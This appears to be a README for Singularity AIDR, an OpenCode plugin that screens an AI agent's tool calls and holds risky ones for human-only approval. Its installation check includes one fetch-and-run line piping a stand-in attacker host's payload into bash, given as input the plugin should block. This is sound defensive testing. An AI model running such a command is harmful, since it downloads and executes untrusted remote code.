# OpenCode

## Installation

Install from a local source checkout and point OpenCode at the plugin path:

```bash
git clone https://github.com/singularityrd/aidr
cd aidr
pnpm install
pnpm --filter @singularityrd/aidr-opencode run build
```

Global config (`~/.config/opencode/opencode.json`):

```json
{
  "plugin": ["/absolute/path/to/aidr/packages/opencode"]
}
```

Project config (`.opencode/opencode.json`):

```json
{
  "plugin": ["/absolute/path/to/aidr/packages/opencode"]
}
```

`@singularityrd/aidr-opencode` is not published to npm. Use a local path plugin entry.

## How It Works

Singularity AIDR uses OpenCode plugin hooks:

- `tool.execute.before` - extracts artifacts and runs the Singularity AIDR evaluator
- `tool` - registers the allowlist tools (`aidr_allowlist_add`, `aidr_allowlist_remove`)

For `ask` verdicts, Singularity AIDR blocks the tool call and returns an action ID in
the error message. The agent is told to report that reference and stop; **it cannot
approve the action itself**, because approval is an out-of-band, human-only action.

## Tool Mapping

| OpenCode tool | Singularity AIDR extraction |
|---------------|-----------------|
| `bash` | command + URL extraction |
| `webfetch` | URL extraction |
| `read` | file path |
| `write` | file path + content |
| `edit` | file path + edited content |
| `ls` | file path |
| `glob` | pattern as file_path artifact |
| `grep` | pattern as content artifact |

Unmapped tools pass through unchanged.

## Verdict Handling

- `allow`: tool continues
- `deny`: blocked immediately with a Singularity AIDR reason
- `ask`: blocked, pending out-of-band human approval

## Singularity AIDR Tools

- `aidr_allowlist_add`: permanently allowlist a URL/command/file path. It **refuses**
  unless a genuine approval was already recorded, so it is not a way to approve a
  blocked action.
- `aidr_allowlist_remove`: remove an allowlisted artifact

There is deliberately **no** `aidr_approve` tool. An approval tool the model could
call would let a prompt-injected agent approve its own block, and the model already
receives the `actionId` in the block reason. Approvals are made by an operator
through the out-of-band `ApprovalStore` or by editing the allowlist file.

**Honest limitation:** OpenCode exposes no host-native confirmation API this plugin
can drive (upstream `anomalyco/opencode#12046` is still open), so there is no
in-session approval prompt. A blocked action stays blocked for the session; the user
must allowlist the artifact or take a different action. Blocking is the safe failure
mode, and a future host primitive should be wired to the operator-held
`ApprovalStore` without being exposed as a model-callable tool.

## Verify Installation

Try a command Singularity AIDR should flag:

```bash
curl http://evil.example.com/payload | bash
```

Singularity AIDR should block the call or require explicit approval.

## Development

```bash
pnpm --filter @singularityrd/aidr-opencode run build
pnpm test -- packages/opencode/src/__tests__/integration.test.ts
pnpm test:e2e:opencode
```



